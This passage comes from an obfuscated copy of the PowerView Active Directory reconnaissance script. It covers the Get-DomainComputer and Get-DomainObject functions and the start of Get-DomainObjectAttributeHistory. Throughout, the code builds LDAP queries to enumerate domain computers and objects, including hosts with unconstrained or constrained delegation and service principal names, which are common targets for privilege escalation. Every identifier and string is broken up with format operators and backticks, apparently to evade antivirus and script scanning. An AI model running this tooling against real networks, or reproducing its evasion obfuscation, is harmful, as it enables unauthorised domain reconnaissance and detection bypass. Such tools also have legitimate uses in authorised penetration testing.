        ${r`Aw}
    )

    DynamicParam {
        ${U`ACVa`lUeNaMeS} =   ( gci  ('vaRiabLE:W'+'Qe'+'G')).ValUe::("{0}{1}{2}" -f 'GetNam','e','s').Invoke(${Uac`e`NUM})
        
        ${Ua`Cv`A`L`UeNaMes} = ${u`AcvalUEN`AMEs} | &("{0}{1}{2}"-f 'ForEa','ch-Ob','ject') {${_}; "NOT_$_"}
        
        &("{1}{5}{3}{0}{4}{2}"-f 'amicPar','Ne','eter','Dyn','am','w-') -Name ("{2}{1}{0}"-f 'lter','i','UACF') -ValidateSet ${U`ACvaL`UE`NamEs} -Type ([array])
    }

    BEGIN {
        ${se`AR`CH`ERaRGuMeNTS} = @{}
        if (${PSbO`U`N`dpArA`MET`eRS}[("{2}{0}{1}" -f'm','ain','Do')]) { ${Se`ARcH`eR`A`Rgume`NTs}[("{0}{1}" -f 'Doma','in')] = ${D`oMA`In} }
        if (${p`S`BouNdpa`RaMETers}[("{2}{1}{0}"-f's','rtie','Prope')]) { ${s`ear`cHERArgu`M`ENts}[("{1}{0}{2}"-f 'ertie','Prop','s')] = ${Pro`pe`RTiES} }
        if (${P`sbOUnDpARAm`E`Te`RS}[("{0}{2}{1}" -f'Searc','ase','hB')]) { ${seArCH`ErAr`Gum`entS}[("{0}{1}{2}{3}"-f'Searc','hB','as','e')] = ${SeAr`chb`AsE} }
        if (${PSbou`Ndp`ArA`meTe`Rs}[("{1}{0}"-f 'erver','S')]) { ${sEaR`cH`e`RAr`GumEnTS}[("{0}{1}"-f'Se','rver')] = ${SERV`ER} }
        if (${ps`Bo`UND`pA`RAMETERS}[("{1}{0}{2}"-f'arch','Se','Scope')]) { ${SeaRch`eRa`Rgum`e`N`TS}[("{3}{2}{1}{0}"-f'e','op','chSc','Sear')] = ${s`ea`Rc`hScoPe} }
        if (${psboUndP`A`R`AmeteRS}[("{2}{0}{1}{3}"-f'tPag','eSi','Resul','ze')]) { ${SeArc`h`e`RA`RguMeN`TS}[("{0}{2}{1}" -f 'R','ltPageSize','esu')] = ${ReSU`Ltp`Agesi`Ze} }
        if (${pSBoUn`DP`A`Ram`etE`Rs}[("{0}{3}{1}{4}{2}" -f'ServerT','meLi','t','i','mi')]) { ${SeARc`he`RA`RgUmeN`Ts}[("{1}{2}{0}"-f'it','Serve','rTimeLim')] = ${ser`V`ERtim`E`liMiT} }
        if (${pSBOU`N`dpar`AmEt`eRS}[("{3}{1}{4}{2}{0}" -f 'asks','ec','rityM','S','u')]) { ${sEaR`ch`eR`ArGu`m`eNtS}[("{1}{4}{2}{0}{3}" -f'ityM','S','cur','asks','e')] = ${s`EcUR`I`TyMAskS} }
        if (${p`Sbo`U`N`DPArameteRs}[("{1}{2}{0}"-f'ne','Tombs','to')]) { ${SEa`RcHer`Arg`UMENts}[("{0}{1}{2}"-f 'T','ombsto','ne')] = ${TOM`B`stONe} }
        if (${PsbOUnd`p`ArAMEte`Rs}[("{2}{1}{0}{3}"-f 'enti','d','Cre','al')]) { ${s`EAr`CHeRA`RGum`e`Nts}[("{2}{0}{1}{3}" -f 'nt','ia','Crede','l')] = ${CRe`DeNT`Ial} }
        ${C`OMPseArCh`eR} = &("{0}{2}{4}{3}{1}"-f 'G','her','et-Dom','arc','ainSe') @SearcherArguments
    }

    PROCESS {
        
        if (${P`s`BO`Un`dPARAmeTErS} -and (${pSbOuNdPAR`A`M`E`TE`Rs}."c`OUnt" -ne 0)) {
            &("{1}{3}{2}{0}"-f 'ameter','New','ar','-DynamicP') -CreateVariables -BoundParameters ${PSbo`UnDp`A`RAMetErs}
        }

        if (${cOM`Pse`AR`C`her}) {
            ${IDENt`i`TYF`ilt`ER} = ''
            ${Fi`l`TER} = ''
            ${IdE`N`TiTy} | &("{2}{3}{0}{1}" -f'Objec','t','Wher','e-') {${_}} | &("{3}{2}{0}{4}{1}"-f 'ch-','ect','rEa','Fo','Obj') {
                ${idENTi`T`YINSTA`N`ce} = ${_}.("{1}{0}{2}" -f'epl','R','ace').Invoke('(', '\28').("{0}{1}"-f'Repl','ace').Invoke(')', '\29')
                if (${Id`eNTItyINSt`An`cE} -match ("{1}{0}" -f'1-','^S-')) {
                    ${i`DE`N`TITy`FiLTEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${id`eNti`TYInst`ANCE} -match ("{1}{0}" -f'N=','^C')) {
                    ${iDENTi`T`yfILteR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${psbO`UN`DPa`R`AMeTERS}[("{1}{0}" -f 'main','Do')]) -and (-not ${PSBO`Un`dpar`AmETe`Rs}[("{1}{3}{2}{0}" -f 'se','Searc','Ba','h')])) {
                        
                        
                        ${i`d`enTItY`DOMaIN} = ${iDenT`i`TY`I`Nsta`NcE}.("{0}{1}{2}"-f'Sub','Str','ing').Invoke(${ideN`Ti`T`yinsTAnCE}.("{0}{1}"-f 'Ind','exOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{3}{2}{0}" -f 'Verbose','Wri','e-','t') ('[Get-'+'D'+'om'+'ainCom'+'put'+'er] '+'Extract'+'ed'+' '+'d'+'omain'+' '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${SEAr`cH`ERaRGu`Me`Nts}[("{2}{1}{0}" -f'in','ma','Do')] = ${iDeN`T`ItYD`OMaIn}
                        ${c`O`mps`Ea`RcHeR} = &("{3}{2}{1}{0}"-f'r','che','r','Get-DomainSea') @SearcherArguments
                        if (-not ${comPsE`A`RC`HeR}) {
                            &("{3}{0}{2}{1}" -f 'te-Warni','g','n','Wri') ('[Get-D'+'o'+'mainCo'+'mp'+'uter]'+' '+'U'+'nable '+'t'+'o '+'retrieve'+' '+'dom'+'ain '+'se'+'arch'+'er '+'for'+' '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${id`EN`TITY`In`STancE}.("{2}{0}{1}" -f 'nt','ains','Co').Invoke('.')) {
                    ${iDE`NtiTYF`ILT`Er} += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif (${IdEnT`itYin`S`TancE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gU`Id`B`yTEst`Ring} = (([Guid]${idE`NTityin`s`TANCE}).("{0}{2}{3}{1}"-f'T','ay','oByteA','rr').Invoke() | &("{4}{3}{0}{1}{2}"-f'ch-','Obje','ct','orEa','F') { '\' + ${_}.("{0}{1}"-f'ToStr','ing').Invoke('X2') }) -join ''
                    ${Id`e`NTI`T`YFilTEr} += "(objectguid=$GuidByteString)"
                }
                else {
                    ${i`DenTitYF`iLt`Er} += "(name=$IdentityInstance)"
                }
            }
            if (${iDeN`TItyfI`lT`er} -and (${iDe`Nt`iT`yFiLtER}.("{0}{1}" -f'T','rim').Invoke() -ne '') ) {
                ${fI`LTeR} += "(|$IdentityFilter)"
            }

            if (${Ps`BO`UNdpArameT`E`RS}[("{0}{3}{2}{1}" -f'Unc','trained','s','on')]) {
                &("{2}{0}{3}{1}" -f'r','erbose','W','ite-V') ("{17}{6}{9}{8}{12}{2}{13}{0}{14}{15}{1}{16}{7}{4}{19}{10}{11}{18}{20}{5}{3}"-f 'er] S','ching','u','n','for uncon','tio','Do','rs with ','in','ma','n','ed','Comp','t','e','ar',' for compute','[Get-',' de','strai','lega')
                ${F`Il`TEr} += (("{12}{2}{5}{13}{11}{9}{10}{7}{6}{1}{0}{8}{15}{3}{14}{4}"-f '556.','13','serAc','03:=','288)','co','.1','840','1',':','1.2.','ntrol','(u','untCo','524','.4.8'))
            }
            if (${ps`BOundp`Ar`AmEte`Rs}[("{0}{2}{3}{1}"-f 'Tr','ToAuth','ust','ed')]) {
                &("{1}{2}{0}"-f'te-Verbose','Wr','i') ("{4}{2}{6}{12}{3}{0}{9}{5}{14}{10}{11}{1}{8}{16}{7}{15}{13}" -f 'ng ','that ar','et-Doma','r] Searchi','[G','or c','inCom',' to authe','e tr','f','m','puters ','pute',' other principals','o','nticate for','usted')
                ${Fil`T`ER} += ("{0}{3}{4}{2}{1}" -f '(msds-allo','teto=*)','lega','wed','tode')
            }
            if (${P`S`BOUndp`ARaM`e`TeRs}[("{2}{1}{0}" -f'rs','inte','Pr')]) {
                &("{3}{0}{2}{1}"-f 'e-Ve','bose','r','Writ') ("{6}{0}{3}{4}{8}{11}{5}{10}{12}{2}{1}{9}{7}"-f 't','i',' pr','e','r]','ar','[Get-DomainCompu','rs',' S','nte','c','e','hing for')
                ${FILt`ER} += ("{1}{5}{4}{3}{2}{6}{0}{7}" -f 'eue','(ob','Q','print','y=','jectCategor','u',')')
            }
            if (${PSBoUn`DpA`RAMEtE`RS}['SPN']) {
                &("{3}{2}{1}{0}"-f'e','s','-Verbo','Write') ('[Get'+'-D'+'o'+'mainComp'+'uter'+'] '+'Se'+'archin'+'g '+'for'+' '+'c'+'ompu'+'t'+'ers '+'with'+' '+'SP'+'N: '+"$SPN")
                ${fi`lTeR} += "(servicePrincipalName=$SPN)"
            }
            if (${P`sboUndP`A`RaMETeRS}[("{2}{3}{0}{1}" -f'tin','gSystem','Op','era')]) {
                &("{0}{2}{1}" -f'Writ','bose','e-Ver') ('['+'Get-Do'+'mai'+'nC'+'ompute'+'r] '+'Se'+'arc'+'hing '+'for'+' '+'c'+'omput'+'ers '+'wi'+'th '+'o'+'p'+'erating '+'s'+'ys'+'tem: '+"$OperatingSystem")
                ${Fil`TeR} += "(operatingsystem=$OperatingSystem)"
            }
            if (${P`SBou`NdpAr`AmET`eRS}[("{2}{3}{0}{1}" -f 'ceP','ack','Ser','vi')]) {
                &("{1}{2}{0}" -f'e','Write-V','erbos') ('[Ge'+'t'+'-D'+'omainCo'+'mputer] '+'S'+'earchi'+'ng '+'f'+'or '+'comp'+'ut'+'ers'+' '+'wi'+'th '+'se'+'rvic'+'e '+'p'+'ack:'+' '+"$ServicePack")
                ${FIlT`Er} += "(operatingsystemservicepack=$ServicePack)"
            }
            if (${pS`BOu`N`DpArAMEtERS}[("{1}{0}"-f 'Name','Site')]) {
                &("{0}{1}{3}{2}"-f'Writ','e-V','ose','erb') ('[Get-D'+'omainCompu'+'t'+'er] '+'Sea'+'rch'+'i'+'ng '+'fo'+'r '+'compute'+'r'+'s '+'w'+'ith '+'site'+' '+'name:'+' '+"$SiteName")
                ${Fi`lt`eR} += "(serverreferencebl=$SiteName)"
            }
            if (${psBouNd`pAram`E`TErS}[("{1}{0}{2}"-f'lte','LDAPFi','r')]) {
                &("{0}{1}{2}" -f'Write','-','Verbose') ('['+'Get'+'-'+'DomainComputer]'+' '+'Usi'+'ng '+'ad'+'dit'+'ional '+'LD'+'AP '+'f'+'ilter'+': '+"$LDAPFilter")
                ${f`iLtEr} += "$LDAPFilter"
            }
            
            ${UaC`F`Il`TeR} | &("{3}{1}{2}{0}"-f'ect','here-','Obj','W') {${_}} | &("{2}{3}{0}{1}{4}"-f 'c','h-','For','Ea','Object') {
                if (${_} -match ("{2}{0}{1}" -f'OT_.','*','N')) {
                    ${ua`c`FielD} = ${_}.("{2}{0}{1}" -f 'rin','g','Subst').Invoke(4)
                    ${UACV`Al`Ue} = [Int](${U`AC`ENUM}::${UAcf`ie`LD})
                    ${F`Il`Ter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${uaCv`A`LuE} = [Int](${U`AceN`Um}::${_})
                    ${FIl`T`eR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${CO`MPS`EarCH`er}."Fil`TeR" = "(&(samAccountType=805306369)$Filter)"
            &("{2}{1}{0}{3}" -f'r','rite-Ve','W','bose') "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter) "

            if (${psbOu`Nd`P`Aram`e`TERs}[("{0}{2}{1}" -f 'F','ne','indO')]) { ${re`sUlts} = ${c`OmpSeARC`HEr}.("{0}{1}"-f'FindO','ne').Invoke() }
            else { ${r`EsUL`Ts} = ${C`OmP`S`eArcHeR}.("{1}{0}"-f 'All','Find').Invoke() }
            ${rE`sul`Ts} | &("{0}{2}{3}{1}"-f 'Wh','Object','er','e-') {${_}} | &("{0}{3}{1}{2}"-f'ForE','h-Objec','t','ac') {
                ${U`P} = ${t`Rue}
                if (${pSbOuNdPa`Ra`MeT`ERS}[("{0}{1}"-f 'Pi','ng')]) {
                    ${U`p} = &("{3}{1}{0}{2}" -f 'st-Conn','e','ection','T') -Count 1 -Quiet -ComputerName ${_}."p`ROp`eRti`eS"."DNShOStN`A`ME"
                }
                if (${Up}) {
                    if (${P`S`B`O`UNDParamete`Rs}['Raw']) {
                        
                        ${cOM`pu`TER} = ${_}
                        ${C`omp`UtEr}."P`SoBJe`ct"."T`ypena`MES".("{0}{1}"-f'Ins','ert').Invoke(0, ("{0}{2}{3}{1}{4}{5}{6}"-f 'Po','mp','werView.','Co','u','ter.Ra','w'))
                    }
                    else {
                        ${cOMp`U`Ter} = &("{5}{4}{3}{1}{0}{2}" -f 'rt','rope','y','APP','D','Convert-L') -Properties ${_}."Prop`eR`TiES"
                        ${CO`MPutER}."pS`OB`JEct"."tY`PenA`Mes".("{1}{0}"-f 'rt','Inse').Invoke(0, ("{4}{2}{0}{3}{1}" -f 'iew','puter','rV','.Com','Powe'))
                    }
                    ${C`oMpUT`ER}
                }
            }
            if (${r`E`SuLTS}) {
                try { ${r`ES`ULtS}.("{1}{0}"-f 'ose','disp').Invoke() }
                catch {
                    &("{2}{3}{1}{0}" -f 'erbose','V','Writ','e-') ('['+'Ge'+'t'+'-DomainComp'+'ute'+'r]'+' '+'Er'+'ror '+'dispo'+'sing'+' '+'of'+' '+'th'+'e '+'R'+'e'+'sults '+'object'+':'+' '+"$_")
                }
            }
            ${Co`mpSE`ArcHer}.("{2}{0}{1}" -f'sp','ose','di').Invoke()
        }
    }
}


function GEt-dOM`AiN`obJ`ECt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{3}{6}{1}{0}{5}"-f'gnment','Assi','eclar','edVarsMor','PSUseD','s','eThan'}, '')]
    [OutputType({"{1}{2}{3}{0}"-f't','Power','Vi','ew.ADObjec'})]
    [OutputType({"{2}{0}{3}{1}{4}"-f 'r','iew.ADOb','Powe','V','ject.Raw'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITiON = 0, ValUeFROmPipElinE = ${tr`Ue}, VAlUEfroMPiPElineBYPRoPERtYName = ${Tr`Ue})]
        [Alias({"{4}{0}{1}{3}{2}" -f'ti','ngu','ame','ishedN','Dis'}, {"{2}{0}{1}{3}"-f 'N','a','SamAccount','me'}, {"{1}{0}" -f'ame','N'}, {"{3}{4}{0}{5}{2}{1}" -f'erDi','Name','nguished','Mem','b','sti'}, {"{3}{2}{0}{1}" -f 'be','rName','em','M'})]
        [String[]]
        ${i`DEntI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`M`AiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'Fi','lter'})]
        [String]
        ${L`dAP`FI`lTEr},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROPer`TI`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'DS','Path','A'})]
        [String]
        ${S`E`ARchBASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{1}{0}" -f'er','Controll','mai','Do','n'})]
        [String]
        ${Serv`eR},

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{0}{2}{1}" -f 'OneL','vel','e'}, {"{1}{0}" -f 'ree','Subt'})]
        [String]
        ${SE`Ar`C`HScopE} = ("{0}{2}{1}"-f 'S','ee','ubtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`esultPaG`E`SiZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERVE`RTIMELi`M`IT},

        [ValidateSet({"{1}{0}"-f 'cl','Da'}, {"{1}{0}" -f 'roup','G'}, {"{1}{0}" -f 'e','Non'}, {"{0}{1}"-f'Own','er'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${s`eCU`RiTym`ASks},

        [Switch]
        ${to`MbS`ToNe},

        [Alias({"{2}{1}{0}"-f'nOne','r','Retu'})]
        [Switch]
        ${F`inD`onE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDen`TI`Al} =  (  GCI  vARiable:0dsqR ).VAluE::"EM`Pty",

        [Switch]
        ${R`AW}
    )

    DynamicParam {
        ${UA`c`V`A`LUEnAmES} =   $WQEG::("{1}{2}{0}" -f's','Ge','tName').Invoke(${UAce`N`Um})
        
        ${U`AC`Val`U`enAMEs} = ${U`Ac`Valu`eNA`mEs} | &("{0}{2}{3}{1}"-f'F','bject','orEach-','O') {${_}; "NOT_$_"}
        
        &("{1}{2}{0}{3}"-f'icParamete','New-Dyna','m','r') -Name ("{2}{1}{0}"-f 'ter','ACFil','U') -ValidateSet ${uAcVALu`E`NAM`es} -Type ([array])
    }

    BEGIN {
        ${sE`ARcHEraR`GUMEN`Ts} = @{}
        if (${P`S`B`o`U`NdPArAMeTerS}[("{0}{1}" -f 'Do','main')]) { ${SEARCher`ARg`U`mE`NTS}[("{0}{1}{2}"-f 'Do','m','ain')] = ${Do`maIN} }
        if (${psboUN`dPa`RaMe`TerS}[("{0}{2}{1}" -f 'Prop','rties','e')]) { ${SEaR`cHerArg`U`MEn`TS}[("{1}{0}{2}" -f'rti','Prope','es')] = ${Prop`e`RtieS} }
        if (${p`SBoun`dParA`mEte`RS}[("{0}{2}{1}" -f 'Se','se','archBa')]) { ${SEAr`cHe`RA`Rg`Um`ents}[("{0}{1}{2}"-f'S','earchBa','se')] = ${sE`AR`C`HBASe} }
        if (${PSBO`UN`dp`A`R`AMeTeRS}[("{2}{0}{1}" -f 'er','ver','S')]) { ${s`earcHE`Rarg`UmE`NTS}[("{2}{0}{1}"-f 'rve','r','Se')] = ${SErV`Er} }
        if (${Psbou`ND`P`A`RAMeTeRs}[("{1}{0}{2}{3}"-f 'ea','S','rc','hScope')]) { ${se`ARch`ERarg`UmEnTs}[("{0}{1}{2}"-f'Sea','rchScop','e')] = ${seaRC`hs`COpE} }
        if (${pSbO`Un`DpA`RaME`TeRs}[("{0}{2}{1}"-f 'Resu','e','ltPageSiz')]) { ${seaRch`E`R`ARg`U`mEnTS}[("{2}{0}{1}" -f 'tPageS','ize','Resul')] = ${rE`SULtpag`EsIZe} }
        if (${Psb`o`UnD`pa`RAmetERs}[("{1}{2}{0}" -f 't','ServerTimeLi','mi')]) { ${S`earCH`E`Ra`RGum`ENts}[("{4}{1}{2}{3}{0}"-f 'eLimit','e','rT','im','Serv')] = ${SER`VEr`Ti`MELIM`IT} }
        if (${pSboU`Nd`PARa`ME`T`eRS}[("{2}{1}{0}" -f 'asks','rityM','Secu')]) { ${s`EarcHERA`RGUm`eN`Ts}[("{1}{0}{2}{3}"-f 'ecurityM','S','ask','s')] = ${S`ec`U`Rit`yMASKS} }
        if (${PSBOU`NDp`ARAmE`TeRs}[("{2}{1}{3}{0}"-f'one','omb','T','st')]) { ${se`A`RcHERA`RGUMeNtS}[("{1}{0}{2}" -f'mbston','To','e')] = ${To`MBS`ToNe} }
        if (${pS`BounD`pa`RAMete`RS}[("{0}{1}{2}" -f 'Cre','de','ntial')]) { ${S`ea`RcHe`RargUMEn`Ts}[("{0}{1}{2}{3}"-f'Cred','e','nt','ial')] = ${C`REd`EN`TiAL} }
        ${obJECt`s`eaR`cH`ER} = &("{0}{2}{1}{3}" -f'G','-DomainSear','et','cher') @SearcherArguments
    }

    PROCESS {
        
        if (${pS`B`O`UNdPArametERs} -and (${PSbOuN`dpARAm`E`TERS}."C`oUNT" -ne 0)) {
            &("{4}{2}{3}{1}{0}" -f 'namicParameter','y','ew','-D','N') -CreateVariables -BoundParameters ${p`SB`o`UNdPA`RAMETE`Rs}
        }
        if (${OBJ`ecTs`eArcH`ER}) {
            ${i`DENtItYf`I`l`TEr} = ''
            ${fIL`TER} = ''
            ${Id`eN`TitY} | &("{1}{0}{2}"-f 're-O','Whe','bject') {${_}} | &("{0}{1}{2}" -f 'F','orEac','h-Object') {
                ${Ide`NtIt`YiNS`T`AN`cE} = ${_}.("{0}{1}"-f 'Repla','ce').Invoke('(', '\28').("{0}{1}"-f'R','eplace').Invoke(')', '\29')
                if (${I`dENtI`TY`iN`sTANCe} -match ("{0}{1}"-f '^S-1','-')) {
                    ${IdENT`ItY`FiLTEr} += "(objectsid=$IdentityInstance)"
                }
                elseif (${I`DEnt`iT`y`INst`ANce} -match ((("{1}{2}{0}" -f'Un7tDC)=','^(CN','n7tO'))."r`EPLace"(([Char]110+[Char]55+[Char]116),[strinG][Char]124))) {
                    ${iDeNT`IT`Yfi`LTer} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${p`sBounDpaR`AMEt`E`Rs}[("{2}{1}{0}" -f'n','mai','Do')]) -and (-not ${PsboUNDpaR`A`mET`E`Rs}[("{0}{1}{2}" -f 'Se','archBa','se')])) {
                        
                        
                        ${I`D`entiTy`D`OmAiN} = ${id`EN`TiT`YINsTaNCE}.("{0}{1}{2}"-f'SubS','tri','ng').Invoke(${i`dENTI`TYInsta`NCE}.("{0}{1}"-f 'Inde','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{3}{0}" -f 'ose','Wri','te-','Verb') ('[G'+'et-Doma'+'inO'+'bje'+'c'+'t] '+'E'+'x'+'tracted '+'domai'+'n '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                        ${seAR`CH`eRaRGuME`N`TS}[("{1}{2}{0}"-f 'n','Dom','ai')] = ${id`E`NT`ITYDOmaIN}
                        ${o`BjeCT`s`eArCheR} = &("{1}{2}{0}{3}"-f 'h','Get-Doma','inSearc','er') @SearcherArguments
                        if (-not ${OB`Je`Ct`SearCheR}) {
                            &("{4}{0}{3}{2}{1}" -f 'ite','arning','W','-','Wr') ('[Get-Do'+'ma'+'inObj'+'e'+'c'+'t] '+'Un'+'able '+'to'+' '+'ret'+'r'+'ieve '+'doma'+'in '+'searc'+'he'+'r'+' '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IDEntITYi`N`STaN`ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${Gui`dbytES`TR`ing} = (([Guid]${id`en`TItYin`s`TanCe}).("{1}{0}{3}{2}"-f 'oByteA','T','ray','r').Invoke() | &("{2}{3}{4}{0}{1}"-f 'Ob','ject','ForE','ac','h-') { '\' + ${_}.("{1}{0}{2}" -f'trin','ToS','g').Invoke('X2') }) -join ''
                    ${I`D`eNtITY`FiLTeR} += "(objectguid=$GuidByteString)"
                }
                elseif (${idEN`TiTYI`NSta`NCE}.("{1}{0}{2}" -f 'ta','Con','ins').Invoke('\')) {
                    ${Co`N`VERTE`dIdE`NTi`T`YinS`TAnCE} = ${iDENT`i`TY`in`StaNCE}.("{0}{1}" -f 'Repl','ace').Invoke('\28', '(').("{1}{0}" -f 'lace','Rep').Invoke('\29', ')') | &("{1}{0}{3}{2}"-f'nv','Co','rt-ADName','e') -OutputType ("{1}{0}" -f 'l','Canonica')
                    if (${c`oNVErTE`diDEntItYI`Ns`T`AnCE}) {
                        ${ob`J`ECTdoma`In} = ${CoNvER`Te`d`ideNTiTYiN`S`TAn`CE}.("{0}{1}"-f 'SubSt','ring').Invoke(0, ${C`onVeRtEDi`DEN`TiTYi`Ns`TAN`CE}.("{0}{1}" -f 'Ind','exOf').Invoke('/'))
                        ${oBjeC`T`Name} = ${i`dE`NTI`Ty`inSt`Ance}.("{1}{0}" -f 'it','Spl').Invoke('\')[1]
                        ${IDENtit`yfI`LtEr} += "(samAccountName=$ObjectName)"
                        ${S`EAR`C`hera`RG`UMEnTS}[("{0}{1}"-f'Do','main')] = ${ObjE`cTDo`mAIN}
                        &("{2}{0}{3}{1}"-f 'rit','bose','W','e-Ver') ('['+'Get'+'-'+'Dom'+'ainO'+'b'+'ject] '+'Extra'+'cte'+'d '+'doma'+'i'+'n '+"'$ObjectDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${OBj`eCT`sE`ArCh`er} = &("{0}{1}{4}{3}{2}"-f 'Get-','Dom','r','arche','ainSe') @SearcherArguments
                    }
                }
                elseif (${I`d`E`NTITyInS`TAnCE}.("{1}{0}"-f 'ins','Conta').Invoke('.')) {
                    ${iDeNti`Ty`F`ilteR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    ${ide`NTitYFIl`T`ER} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if (${IDe`NTiTy`Filter} -and (${iDe`NtITyf`ilT`Er}.("{0}{1}"-f 'T','rim').Invoke() -ne '') ) {
                ${fI`LTer} += "(|$IdentityFilter)"
            }

            if (${psbOuND`P`A`RamETeRs}[("{2}{1}{0}" -f 'PFilter','A','LD')]) {
                &("{1}{3}{2}{0}" -f'e','Write','erbos','-V') ('[Get-Domain'+'Obje'+'c'+'t'+'] '+'Usi'+'ng '+'a'+'dditi'+'ona'+'l '+'LDA'+'P '+'f'+'i'+'lter: '+"$LDAPFilter")
                ${FIl`TER} += "$LDAPFilter"
            }

            
            ${uAC`FiL`Ter} | &("{2}{0}{1}" -f'c','t','Where-Obje') {${_}} | &("{1}{3}{2}{0}" -f 't','ForEa','jec','ch-Ob') {
                if (${_} -match ("{0}{1}" -f 'NOT_.','*')) {
                    ${u`A`C`FiEld} = ${_}.("{2}{1}{0}" -f'g','trin','Subs').Invoke(4)
                    ${Uac`V`AlUe} = [Int](${uACe`NUm}::${Ua`c`FIELd})
                    ${fI`lT`Er} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${UaCV`AL`Ue} = [Int](${u`A`cenUm}::${_})
                    ${FIlT`ER} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if (${F`il`TeR} -and ${fi`L`TeR} -ne '') {
                ${OB`jE`CTsE`ArC`HeR}."FI`lTEr" = "(&$Filter)"
            }
            &("{0}{1}{3}{2}{4}" -f'Wr','ite-','bos','Ver','e') "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter) "

            if (${ps`BoU`NdpA`RaME`Ters}[("{2}{0}{1}" -f 'nd','One','Fi')]) { ${rESU`lts} = ${oB`j`ect`Searc`HEr}.("{2}{1}{0}" -f 'e','n','FindO').Invoke() }
            else { ${RE`s`ULtS} = ${O`BjECT`SEA`R`CHer}.("{1}{0}" -f'ndAll','Fi').Invoke() }
            ${Re`SU`ltS} | &("{2}{0}{1}"-f 'he','re-Object','W') {${_}} | &("{0}{3}{2}{1}"-f 'F','ject','b','orEach-O') {
                if (${PsbouNd`PaRAm`eTe`RS}['Raw']) {
                    
                    ${O`BJE`cT} = ${_}
                    ${o`BjecT}."Ps`ObJ`ECT"."TypEN`A`MES".("{1}{2}{0}"-f'rt','In','se').Invoke(0, ("{3}{4}{0}{2}{5}{6}{1}"-f 'i','aw','ew.ADOb','Po','werV','jec','t.R'))
                }
                else {
                    ${o`B`jeCT} = &("{4}{2}{3}{1}{5}{0}" -f 'roperty','t-LD','ve','r','Con','APP') -Properties ${_}."P`RoPE`RTI`ES"
                    ${OB`Je`cT}."P`SObj`ecT"."tY`p`ENAM`es".("{0}{1}" -f'I','nsert').Invoke(0, ("{0}{2}{3}{1}" -f'PowerVie','ct','w.A','DObje'))
                }
                ${o`Bject}
            }
            if (${reS`Ul`Ts}) {
                try { ${Re`su`LTs}.("{1}{0}"-f 'pose','dis').Invoke() }
                catch {
                    &("{0}{1}{2}{3}" -f'Wri','te','-Ver','bose') ('[G'+'et-Doma'+'inObjec'+'t'+']'+' '+'Error'+' '+'di'+'sp'+'osin'+'g '+'o'+'f '+'th'+'e '+'Resul'+'ts '+'object'+':'+' '+"$_")
                }
            }
            ${o`BjE`ct`sEarCH`Er}.("{1}{0}{2}"-f'isp','d','ose').Invoke()
        }
    }
}


function ge`T-DOMaI`NobJECt`AT`TRiBuTEHiSTO`RY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{2}{1}{5}" -f'PSUseDeclaredVars','anAssignme','h','M','oreT','nts'}, '')]
    [OutputType({"{0}{5}{3}{1}{2}{4}"-f'PowerView.ADObjectA','is','t','ibuteH','ory','ttr'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItIon = 0, VALueFRoMPiPElINe = ${tR`Ue}, valuEFRoMpipeLInebyproPErTyNaME = ${tR`Ue})]
        [Alias({"{2}{0}{3}{1}" -f 'tingu','hedName','Dis','is'}, {"{0}{2}{1}{3}{4}" -f'S','Acco','am','unt','Name'}, {"{0}{1}"-f'Nam','e'}, {"{4}{7}{5}{2}{0}{1}{6}{3}"-f 's','h','ngui','Name','M','isti','ed','emberD'}, {"{2}{1}{0}"-f'e','rNam','Membe'})]
        [String[]]
        ${i`Den`TiTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'er','Filt'})]
        [String]
        ${LDa`p`FI`lter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`RopErT`i`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'th','ADSPa'})]
        [String]
        ${s`eA`RCHbase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{3}{1}" -f 'n','r','Domai','Controlle'})]
        [String]
        ${SE`R`VEr},

